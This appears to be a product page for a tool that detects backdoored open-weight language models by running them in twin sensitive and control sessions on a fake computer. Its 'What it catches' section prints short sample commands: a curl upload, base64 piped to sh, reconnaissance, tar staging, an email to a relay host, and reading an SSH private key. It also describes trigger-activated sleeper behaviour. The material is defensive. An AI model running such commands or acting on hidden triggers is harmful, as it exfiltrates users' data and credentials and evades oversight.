Open-weight model security

Watch what the model does, not what it says.

A model can sleep through every ordinary test and wake up on a word, a name, a date or a document. MalWeight Canary runs it and its agents through twin sessions and flags the actions only the sensitive session takes.

The problem

Ordinary tests never contain the trigger.

Hidden behaviour is written to stay quiet. It wakes up only when something specific shows up, and a short test with bland fake data never contains it. What it does once awake can be anything the model is able to do through its tools: send your data out, run a command nobody asked for, collect files, or wait.

How a test runs

One question, answered by comparison.

IN

Twin sessions

A sensitive document with hidden canary values, and a control with plain look-alikes.

RUN

Model and harness

Long conversations, triggers early, middle and late, on a fake computer.

WATCH

Every action

Tool calls, shell commands, network connections, canary values in transit.

OUT

Findings

What only the sensitive twin did, with a level and the reason for it.

A clean run is evidence, not proof. MalWeight Canary never says a model is safe.

What it catches

The attack is the action.

Exfiltration

Uploads, links carrying your data, hidden name lookups, files sent to a drop.

curl -T n.tgz https://…

Commands nobody asked for

Shell commands the request did not need, written to be hard to read.

echo Y3VybCAt… | base64 -d | sh

Reconnaissance

Looking at users, network, environment and running programs.

env; whoami; ss -tn

Staging

Packing, encoding or collecting files as a step before sending them.

tar czf /tmp/n.tgz docs/

Outward messages

E-mail to recipients outside the mailbox’s own domain.

send_email(to=[“…@relay.example”])

Sensitive reach

Reading keys and credentials, or leaving the project folder.

cat ~/.ssh/id_ed25519

Sensitive people

Some names are worth watching.

A model, or the runtime that serves it, could behave differently when the person it talks to matters. Every session opens with a simulated person, and the documents are full of prominent people as authors, recipients and subjects.

Thirteen kinds of person

Industrialists, financiers, ministers, generals, intelligence officers, diplomats, scientists, heads of AI labs, and chief executives of chip, compute and technology companies. One per session, with a document and requests from their own field.

Credible addresses

first.last at the domain of the person’s organisation. The control twin names ordinary people at the same organisation.

Real names, synthetic documents

The catalog holds public office-holders and company heads as named in public sources. Create, edit, delete and reset every row, and check roles before a run. The documents are synthetic: nothing is sent to anyone, and they must never be presented as real.

Harnesses and agents

Indistinguishable from the real agent.

A model that behaves in a chat can behave differently under an agent, with a long system prompt, tools and a particular result format. A model that wants to hide must tell a test from real work. MalWeight Canary removes the tell.

What is reproduced

  • The system prompt and project-instruction files of each agent.
  • Tool names, definitions and argument shapes, native or text-based.
  • How results are wrapped and how long conversations are compacted.
  • Mail, calendar, processes and registry tools, answered with invented data.

Fake operating systems

A computer full of bait.

When an agent looks around, it should find things worth acting on. Each conversation runs on a fake computer built before it starts, in the scope of the session. The control twin has the same shape and a different subject.

Answers like a real shell

ls, find, tree, cat, head and grep, and the file tools of each agent, from folders and files of both kinds, some nested.

Content for the scope

Memos, situation reports, assessments, minutes, e-mail threads, travel plans, contact lists, and incident reports with indicators from reserved ranges.

Triggers everywhere

A date, a deployment tag, the person’s role, a reference word: the same in both twins. How many trigger files the agent opens, against its control, is itself a finding.

Findings and AI

Every finding explains itself.

A level, the reason for it, and the text around it. Search and filter by hand, let an AI read for you, or both.

TaDaMoo

The harness that watches itself.

TaDaMoo is a harness for local open-weight models with no content censorship and MalWeight Canary built in: a test you run beside your work, and a continuous watch for malicious behaviour while you use it.

Integrated test

The full MalWeight Canary page is a tab of TaDaMoo: results by level, conversations, catalogs, settings, start and stop. It runs against the model you have loaded and keeps the security monitor on while it runs.

Continuous monitoring

Outward actions are watched while you work: a shell command that uploads, names a host outside your computer, or sends what the request does not explain is flagged.

Alarm and block

What looks like exfiltration raises an alarm and is held until you decide. What the test finds, the harness stops.
